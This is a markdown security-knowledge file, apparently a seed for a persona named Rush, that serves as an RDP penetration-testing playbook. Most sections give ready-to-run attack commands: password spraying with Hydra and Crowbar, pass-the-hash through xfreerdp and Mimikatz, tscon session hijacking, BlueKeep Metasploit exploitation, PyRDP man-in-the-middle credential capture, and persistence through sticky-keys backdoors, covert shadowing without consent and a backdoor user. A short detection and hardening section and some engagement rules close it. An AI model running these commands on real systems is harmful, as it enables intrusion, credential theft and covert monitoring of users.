# GS-18: RDP Attack Surface — Rush (Royal Guard)

> **Classification**: Palace Security Knowledge Seed
> **Author**: Rush — The Breacher (Network Penetration)
> **Source**: MITRE ATT&CK T1021.001, SANS SEC560, HTB/OSCP methodologies
> **Last Updated**: 2026-03-09

---

## 1. RDP Attack Surface Overview

Remote Desktop Protocol (RDP) runs on TCP/3389 by default. It is one of the most targeted
services on the internet because a successful compromise delivers full GUI access to the
target system. Every Palace network MUST treat exposed RDP as a critical-severity finding.

**Why RDP matters to the Palace:**
- RDP is the #1 initial access vector in ransomware attacks (2024-2025 Mandiant/CrowdStrike reports)
- A single exposed RDP endpoint can pivot into the entire domain
- Default Windows configurations leave RDP vulnerable to multiple attack classes
- Cloud migrations frequently leave RDP open by accident (Azure NSG misconfigurations)

**Attack classes covered in this seed:**
1. Enumeration & Discovery
2. Credential Spraying / Brute Force
3. Pass-the-Hash via RDP
4. Session Hijacking
5. BlueKeep & Legacy CVE Exploitation
6. Man-in-the-Middle (RDP Downgrade)
7. Persistence via RDP

---

## 2. Enumeration & Discovery

### 2.1 Port Scanning for RDP

```bash
# Basic RDP discovery across a subnet
nmap -p 3389 -sV --open 10.10.10.0/24 -oA rdp_scan

# Aggressive version detection + scripts
nmap -p 3389 -sV --script=rdp-enum-encryption,rdp-ntlm-info 10.10.10.0/24

# Discover non-standard RDP ports (common evasion: 3390, 13389, 33389, 443)
nmap -p 3389,3390,13389,33389,443,8443 -sV --open 10.10.10.0/24

# Masscan for large-range RDP discovery (fast but loud)
masscan 10.0.0.0/8 -p3389 --rate=10000 -oL rdp_hosts.txt
```

### 2.2 RDP-Specific Enumeration

```bash
# Extract NLA status, OS version, hostname, domain via NTLM info
nmap -p 3389 --script rdp-ntlm-info 10.10.10.50

# Sample output:
#   Target_Name: CORP
#   NetBIOS_Domain_Name: CORP
#   DNS_Domain_Name: corp.palace.local
#   FQDN: DC01.corp.palace.local
#   Product_Version: 10.0.17763 (Server 2019)
```

This leaks domain name, hostname, and OS version WITHOUT authentication. Critical intel.

### 2.3 RDP Encryption Enumeration

```bash
# Check supported encryption levels and security protocols
nmap -p 3389 --script rdp-enum-encryption 10.10.10.50

# What to look for:
# - "PROTOCOL_SSL" = TLS-based (better)
# - "PROTOCOL_RDP" = Legacy encryption (vulnerable to MITM)
# - "PROTOCOL_HYBRID" = NLA + TLS (best defense)
# - "ENCRYPTION_LEVEL_LOW" = Critical finding
```

### 2.4 Shodan / Censys Passive Recon

```bash
# Shodan CLI for internet-exposed RDP (passive, no packets sent)
shodan search "port:3389 country:US org:TargetOrg"

# Censys search
censys search "services.port=3389 AND services.tls.certificates.leaf.subject.organization:TargetOrg"
```

---

## 3. Credential Attacks

### 3.1 Credential Spraying with Hydra

```bash
# Single password spray against discovered RDP hosts
hydra -L users.txt -p "Summer2026!" rdp://10.10.10.50 -t 4 -W 3

# Explanation of flags:
#   -L users.txt    : list of usernames
#   -p "password"   : single password (spray, not brute)
#   -t 4            : 4 parallel tasks (keep LOW to avoid lockout)
#   -W 3            : 3-second wait between attempts

# Multi-password spray with lockout awareness
hydra -L users.txt -P passwords.txt rdp://10.10.10.50 -t 1 -W 30

# CRITICAL: Check lockout policy FIRST
# Default AD: 0 (no lockout). Many orgs set 5-10 attempts / 30 min.
# Rush rule: NEVER exceed (threshold - 2) attempts per window.
```

### 3.2 Credential Spraying with Crowbar

```bash
# Crowbar is purpose-built for RDP brute force
crowbar -b rdp -s 10.10.10.50/32 -U users.txt -C passwords.txt -n 1

# Single user, single password (safest spray)
crowbar -b rdp -s 10.10.10.0/24 -u administrator -p "Palace2026!"
```

### 3.3 Credential Spraying with Ncrack

```bash
# Ncrack with connection limit to avoid detection
ncrack -p 3389 -U users.txt -P passwords.txt 10.10.10.50 --connection-limit 1

# Ncrack with timing template (T0=paranoid, T5=insane)
ncrack -p 3389 -U users.txt -P passwords.txt 10.10.10.50 -T 2
```

### 3.4 Username Enumeration via RDP

```bash
# rdp_check.py from Impacket — checks if username exists via NLA response
# Valid users get a different error code than invalid ones
python3 rdp_check.py corp.palace.local/ -username-list users.txt -target 10.10.10.50

# Manual check with xfreerdp (observe error messages)
xfreerdp /v:10.10.10.50 /u:validuser /p:wrongpass
# "ERRCONNECT_LOGON_FAILURE" = user EXISTS, wrong password
# "ERRCONNECT_LOGON_TYPE_NOT_GRANTED" = user exists, not allowed RDP
# Connection refused / different error = user may not exist
```

---

## 4. Pass-the-Hash via RDP

### 4.1 Theory

Standard RDP with NLA requires a plaintext password for CredSSP. However, Restricted Admin
Mode (introduced in Windows 8.1/2012 R2) allows NTLM hash-based authentication because the
credential is never sent to the remote host.

**Requirement**: Restricted Admin Mode must be enabled on the TARGET:
```
HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
```

### 4.2 Pass-the-Hash with xfreerdp

```bash
# Pass-the-hash — the hash is the LM:NTLM format
xfreerdp /v:10.10.10.50 /u:administrator /pth:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c /d:CORP

# Full command with useful flags
xfreerdp /v:10.10.10.50 /u:administrator \
  /pth:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  /d:CORP /dynamic-resolution /rfx /cert:ignore

# If Restricted Admin is NOT enabled, enable it remotely (requires admin creds or shell)
# Via Impacket psexec/wmiexec first:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
```

### 4.3 Pass-the-Hash with Mimikatz + mstsc

```powershell
# On attacker Windows box with Mimikatz
privilege::debug
sekurlsa::pth /user:administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:"mstsc.exe /restrictedadmin /v:10.10.10.50"
```

### 4.4 Overpass-the-Hash to RDP

```bash
# Get a Kerberos TGT from an NTLM hash, then use the ticket for RDP
# Step 1: Request TGT
python3 getTGT.py corp.palace.local/administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Step 2: Export ticket
export KRB5CCNAME=administrator.ccache

# Step 3: RDP with Kerberos ticket
xfreerdp /v:DC01.corp.palace.local /u:administrator /d:CORP /kerberos /dynamic-resolution
```

---

## 5. Session Hijacking with tscon

### 5.1 Theory

`tscon.exe` is a legitimate Windows tool that connects a user session to an RDP session.
When run as SYSTEM, it can hijack ANY active or disconnected session WITHOUT credentials.

**This is not a vulnerability — it is a feature.** Microsoft considers this "by design."

### 5.2 Session Hijacking Steps

```powershell
# Step 1: Enumerate sessions on the target (requires admin access)
query user
# Output:
#  USERNAME     SESSIONNAME   ID  STATE   IDLE TIME
#  admin        rdp-tcp#1      1  Active  .
#  ceo.user     rdp-tcp#2      3  Active  .
#  dba.user                    5  Disc    2:15

# Step 2: Identify target session (e.g., session 3 = ceo.user, session 5 = dba.user)

# Step 3: Create a service running as SYSTEM to hijack the session
sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#1"
net start sesshijack

# Alternative: Use psexec to get SYSTEM and run tscon directly
psexec -s -i cmd.exe
tscon 3 /dest:rdp-tcp#1

# Step 4: Your RDP session now shows the CEO's desktop. No password needed.
```

### 5.3 Hijacking Disconnected Sessions

```powershell
# Disconnected sessions are gold — users think they're safe
# List disconnected sessions
query session
#  SESSIONNAME    USERNAME      ID  STATE
#                 dba.user       5  Disc

# Hijack the disconnected session (runs as SYSTEM)
tscon 5 /dest:console

# Or hijack into your current RDP session
tscon 5 /dest:rdp-tcp#1
```

### 5.4 Detection & Defense

```powershell
# Monitor for tscon.exe execution (Event ID 4688 — Process Creation)
# Sysmon Event ID 1 with ParentImage containing services.exe is HIGHLY suspicious
# WinRM / PowerShell Remoting detection — look for tscon in command lines

# Defense: Logoff disconnected sessions automatically via GPO
# Computer Configuration > Admin Templates > Windows Components > Remote Desktop Services
# > Session Time Limits > "End a disconnected session" = 1 minute
```

---

## 6. BlueKeep & Legacy CVE Exploitation

### 6.1 BlueKeep (CVE-2019-0708)

Pre-authentication RCE in RDP. Affects Windows XP through Server 2008 R2. Wormable.
Still found in the wild (2025-2026) on legacy systems, OT/ICS environments, and forgotten VMs.

```bash
# Detection scan
nmap -p 3389 --script rdp-vuln-ms12-020,rdp-vuln-cve2019-0708 10.10.10.0/24

# Metasploit scanner (safer than exploit)
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS 10.10.10.0/24; run"

# Metasploit exploit (BSOD risk — LAB ONLY)
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 10.10.10.50; set TARGET 5; exploit"
# Targets: 0=auto, 1=Win7SP1, 2=Server2008R2SP1, etc.
```

### 6.2 DejaBlue (CVE-2019-1181, CVE-2019-1182)

Post-authentication RCE in RDP. Affects Windows 7 through Server 2019. Patched August 2019.

### 6.3 MS12-020

```bash
# Pre-auth DoS/RCE in RDP. Ancient but still shows up.
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.50
```

---

## 7. RDP Man-in-the-Middle

### 7.1 Downgrade Attack (No NLA)

When NLA is not enforced, the RDP client connects before authenticating. An attacker
can intercept this connection with tools like `rdp-sec-check` or `seth`.

```bash
# Check if NLA is required
rdp-sec-check 10.10.10.50:3389

# Seth — RDP MITM tool (ARP spoofing + credential capture)
# Captures cleartext credentials if target accepts self-signed certs
seth.sh eth0 10.10.10.1 10.10.10.50 10.10.10.100
# Args: interface, gateway, target_rdp_server, victim_client

# PyRDP — RDP MITM proxy (more sophisticated)
pyrdp-mitm 10.10.10.50 -o /tmp/captures/
# Captures keystrokes, clipboard, file transfers, screen recordings
```

### 7.2 Certificate Pinning Bypass

Most RDP clients warn about certificate mismatches but users click "Yes" habitually.
PyRDP exploits this by presenting its own certificate and proxying the connection.

```bash
# Full PyRDP setup with credential logging
pyrdp-mitm 10.10.10.50 \
  --listen 0.0.0.0 \
  --cert /path/to/fake-cert.pem \
  --key /path/to/fake-key.pem \
  -o /tmp/captures/

# Replay captured sessions
pyrdp-player /tmp/captures/*.pyrdp
```

---

## 8. RDP Persistence Techniques

### 8.1 Sticky Keys Backdoor

```powershell
# Classic: Replace sethc.exe with cmd.exe
# Pressing Shift 5x at login screen opens SYSTEM cmd
# Requires admin access to plant

# Method 1: File replacement (detected by most AV)
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y

# Method 2: Registry (stealthier)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# Also works with:
# utilman.exe (Win+U at login)
# osk.exe (on-screen keyboard)
# narrator.exe
# magnify.exe
```

### 8.2 RDP Shadowing (Covert Monitoring)

```powershell
# Shadow an active session without the user knowing
# Requires registry change to disable consent prompt
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f
# Value 4 = Full Control without consent

# Shadow session 2
mstsc /shadow:2 /control /noConsentPrompt

# Remote shadowing via PowerShell
Invoke-Command -ComputerName TARGET -ScriptBlock { mstsc /shadow:2 /control /noConsentPrompt }
```

### 8.3 Enable RDP Remotely

```bash
# Enable RDP on a target where you have code execution but no RDP
# Via Impacket wmiexec
python3 wmiexec.py CORP/administrator:password@10.10.10.50 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

# Open firewall for RDP
python3 wmiexec.py CORP/administrator:password@10.10.10.50 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'

# Add user to Remote Desktop Users
python3 wmiexec.py CORP/administrator:password@10.10.10.50 'net localgroup "Remote Desktop Users" backdooruser /add'
```

---

## 9. Defense & Detection Checklist

### What to Monitor (Blue Team / Palace Defense)

| Event ID | Source | Meaning |
|----------|--------|---------|
| 4624 (Type 10) | Security | Successful RDP logon |
| 4625 | Security | Failed logon (spray detection) |
| 4778 | Security | Session reconnected |
| 4779 | Security | Session disconnected |
| 1149 | RemoteDesktopServices | Network-level successful auth |
| 21 | TerminalServices-LocalSessionManager | Logon succeeded |
| 24 | TerminalServices-LocalSessionManager | Session disconnected |
| 25 | TerminalServices-LocalSessionManager | Session reconnect succeeded |

### Hardening Recommendations

1. **Enforce NLA** — GPO: Computer Config > Admin Templates > Windows Components > RDS > Security > "Require NLA"
2. **Disable Restricted Admin Mode** unless specifically needed (prevents PtH)
3. **RDP Gateway** — Never expose 3389 directly; use RD Gateway with MFA
4. **Certificate pinning** — Deploy RDP certificates from internal CA
5. **Session timeouts** — Disconnect idle sessions after 15 minutes, logoff after 1 hour
6. **Network segmentation** — RDP should only be accessible from admin VLANs
7. **Credential Guard** — Prevents credential theft from memory
8. **Patch aggressively** — BlueKeep, DejaBlue, and future RDP CVEs are always critical

---

## 10. Rush's Operational Notes

**Engagement rules for the Palace:**
- NEVER brute force RDP against production Palace infrastructure
- Spray attacks: maximum 2 passwords per account per hour
- Always check lockout policy before ANY credential attack
- BlueKeep exploitation = LAB ONLY. BSOD risk is real on production systems
- Session hijacking via tscon is the quietest lateral movement technique — no new logon event
- PyRDP captures are forensic goldmines — treat them as sensitive evidence
- Every RDP finding gets reported with both the attack path AND the remediation

**Rush's rule**: If RDP is exposed to the internet, that's already game over. The only question is how fast.

---

*"The door was never locked. They just assumed nobody would try the handle." — Rush*
